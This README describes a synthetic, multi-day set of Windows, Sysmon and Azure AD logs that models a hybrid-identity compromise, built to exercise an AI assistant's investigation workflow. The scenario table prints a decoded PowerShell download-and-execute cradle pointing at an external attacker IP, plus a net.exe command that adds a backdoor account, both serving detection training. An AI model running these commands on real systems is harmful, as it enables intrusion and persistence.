# logs/ — Synthetic Multi-Source Investigation Dataset

This is **synthetic data**, generated to exercise the "multi-source investigation"
workflow described in the root `CLAUDE.md`. There is no real incident here — it
models a plausible hybrid-identity compromise so the four expected log sources
(Windows Security, Sysmon, Azure AD sign-in, Azure AD audit) can be correlated
against something concrete.

## Layout

```
logs/
  windows/
    sysmon-2026-07-09.xml       sysmon-2026-07-10.xml       sysmon-2026-07-11.xml
    security-2026-07-09.xml     security-2026-07-10.xml     security-2026-07-11.xml
  cloud/
    signins-2026-07-09.jsonl    signins-2026-07-10.jsonl    signins-2026-07-11.jsonl
    audit-2026-07-09.jsonl      audit-2026-07-10.jsonl      audit-2026-07-11.jsonl
```

Each `windows/*.xml` file is a native Windows Event Log export (`<Events
xmlns="http://schemas.microsoft.com/win/2004/08/events/event">` wrapping
multiple `<Event>` elements — the same shape used by `sysmon-parser`'s
`samples/multi_events.xml` and by real EVTX-to-XML exports). Each
`cloud/*.jsonl` file is one JSON object per line, modeled on the real
Microsoft Graph `signInLogs` / `auditLogs` (`directoryAudits`) resource
shapes.

Time range: **2026-07-09 through 2026-07-11** (3 days). The incident is
entirely contained within **2026-07-10** — the other two days are pure benign
noise, so search/filtering across a retention window is actually required,
not just reading one pre-isolated day.

Signal-to-noise: Sysmon ~137 events total (2 malicious), Windows Security
~168 events total (3 malicious), Azure AD sign-in ~257 entries total (1
anomalous sign-in, contrasted against a same-day legitimate one), Azure AD
audit ~62 entries total (2 malicious).

## Environment (hosts, IPs, roles)

| Host | Internal IP | Role |
|---|---|---|
| `WKSTN-017.corp.local` | `10.10.17.55` | `mrodriguez`'s workstation — **patient zero** |
| `WKSTN-042.corp.local` | `10.10.42.10` | `jsmith`'s workstation — noise (reused from `sysmon-parser` samples) |
| `FS01.corp.local` | `10.10.5.10` | File server — **lateral-movement target** |
| `DC1.corp.local` | `10.10.1.10` | Domain controller — noise logon traffic |
| `WKSTN-005/064/088/099.corp.local` | `10.10.5.201` / `10.10.6.64` / `10.10.8.88` / `10.10.9.99` | Noise workstations for other users |

External attacker infrastructure: **`185.220.101.47`** (Tor-exit-style IP —
used for both the endpoint C2 callback and the cloud sign-in).
Corporate cloud egress IPs (legitimate sign-in traffic): `203.0.113.10`,
`203.0.113.11`, `203.0.113.12`.

On-prem identity: NetBIOS domain `CORP`, e.g. `CORP\mrodriguez`.
Cloud identity: UPN suffix `corp.com`, e.g. `mrodriguez@corp.com`. This
mismatch is a normal hybrid Azure AD Connect setup — it's *why* correlating
on-prem and cloud sources requires username normalization (see below).

## Scenario timeline (2026-07-10, all times UTC)

| Time | Source | Event |
|---|---|---|
| 09:07:52.987 | Sysmon EventID 1 | `WINWORD.EXE` (opening `Invoice_7742.docm`) spawns `powershell.exe -Enc ...` on `WKSTN-017`, user `CORP\mrodriguez`. Decoded payload: `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/update.ps1')` |
| 09:08:05.441 | Sysmon EventID 3 | Same `ProcessGuid` as above opens a network connection to `185.220.101.47:443` |
| 11:00:14.331 | Azure AD sign-in | Successful interactive sign-in for `mrodriguez@corp.com` from `185.220.101.47`, `riskLevelDuringSignIn: high`, `riskState: atRisk`, **no** `deviceDetail` populated (contrast with the same user's earlier/later legitimate sign-ins the same day, which all show `deviceDetail.displayName: WKSTN-017`) |
| 11:35:22.004 | Azure AD audit | `"User registered security info"` — a new MFA method added, actor IP `185.220.101.47` |
| 11:50:47.887 | Azure AD audit | `"Consent to application"` — OAuth consent granted to fake service principal **"Data Sync Helper"**, requesting `Mail.Read Mail.ReadWrite Directory.Read.All offline_access`, actor IP `185.220.101.47` |
| 16:04:51.220 | Windows Security 4624 | `CORP\mrodriguez` NTLM network logon (Type 3) onto `FS01.corp.local`, sourced from `10.10.17.55` (WKSTN-017's internal IP) |
| 16:06:14.552 | Windows Security 4688 | `net.exe user helpdesk2 P@ssw0rd2026! /add` on `FS01`, run under the same logon session (`0x458a01`) as the 4624 above |
| 16:06:55.118 | Windows Security 4720 | New local account `helpdesk2` created on `FS01` |

## Correlation keys

**Identity join**: `SubjectDomainName`+`SubjectUserName` (Windows Security) /
`User` (Sysmon, `CORP\user` form) vs. `userPrincipalName` (Azure AD,
`user@corp.com` form). Normalize by stripping the `DOMAIN\` prefix or
`@corp.com` suffix, lowercasing, and comparing the bare account name.

**Hostname join**: Sysmon/Windows Security `Computer`/`WorkstationName`
(`WKSTN-017.corp.local`) vs. Azure AD sign-in `deviceDetail.displayName`
(`WKSTN-017`) — populated on legitimate sign-ins, deliberately blank on the
anomalous one.

**IP join** — two distinct roles that pivot differently:
- `185.220.101.47` (external) ties the Sysmon EventID 3 `DestinationIp` to
  the Azure AD sign-in `ipAddress` and both audit entries' actor IP.
- `10.10.17.55` (internal, WKSTN-017's own IP) ties the Windows Security 4624
  `IpAddress` on `FS01` back to the Sysmon host — this is the lateral-movement
  pivot, distinct from the cloud-facing compromise pivot above.

**Timestamp normalization** — formats genuinely differ across sources, per
CLAUDE.md's warning:
- **Sysmon** `UtcTime`: `"2026-07-10 09:08:05.441"` — space-separated, no
  timezone marker, millisecond precision, implicitly UTC.
- **Windows Security** `TimeCreated/@SystemTime`: `"2026-07-10T16:04:51.2201983Z"`
  — ISO8601, explicit `Z`, 7-digit (100ns tick) fractional precision.
- **Azure AD** `createdDateTime` / `activityDateTime`: `"2026-07-10T11:00:14.3312893Z"`
  — ISO8601, explicit `Z`, comparable precision to Windows Security.

Naive lexicographic/string sorting will **not** correctly interleave Sysmon
timestamps with the other two sources (the space vs. `T` separator breaks
sort order) — normalize all three to timezone-aware UTC `datetime` objects
before merging into one timeline. Sysmon's format needs
`strptime("%Y-%m-%d %H:%M:%S.%f")` + attach UTC tzinfo; the other two parse
as standard ISO8601 (swap trailing `Z` → `+00:00` if your parser doesn't
accept `Z` directly).

## Recommended investigation approach

See `.claude/commands/investigate.md` for the repeatable workflow. In short:
anchor on the suspicious identity or IP → build a timeline skeleton from
Azure AD sign-in logs → pivot to Azure AD audit logs for persistence/permission
changes → pivot to Sysmon for endpoint execution evidence (search *before*
the cloud anomaly) → pivot to Windows Security across the environment for
lateral movement (search *after* the cloud anomaly) → expand scope to any
newly discovered host/account → consolidate into one normalized UTC timeline.
